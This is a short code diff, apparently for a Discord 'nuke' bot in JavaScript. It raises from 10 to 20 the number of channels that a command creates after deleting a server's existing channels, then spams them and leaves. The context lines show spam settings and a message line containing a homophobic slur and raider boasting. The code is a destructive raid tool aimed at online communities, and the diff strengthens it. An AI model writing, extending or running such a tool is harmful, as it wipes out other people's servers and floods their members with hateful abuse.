@@ -42,7 +42,7 @@ client.once('ready', async () => {
         },
         {
             name: 'nuke',
-            description: 'Delete channels, create 10, spam, leave',
+            description: 'Delete channels, create 20, spam, leave',
             options: [
                 { name: 'count', type: 4, description: 'Messages per channel (default 10, max 100)', required: false },
                 { name: 'delay', type: 4, description: 'Delay between messages (ms, default 50)', required: false }
@@ -108,7 +108,7 @@ client.on('interactionCreate', async (interaction) => {
 
         const messagesPerChannel = Math.min(interaction.options.getInteger('count') || 10, 100);
         const delayMs = Math.min(interaction.options.getInteger('delay') || 50, 500);
-        const channelCount = 10;
+        const channelCount = 20; // 👈 Changed from 10 to 20
         const maxLength = 2000;
 
         const baseLine = '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
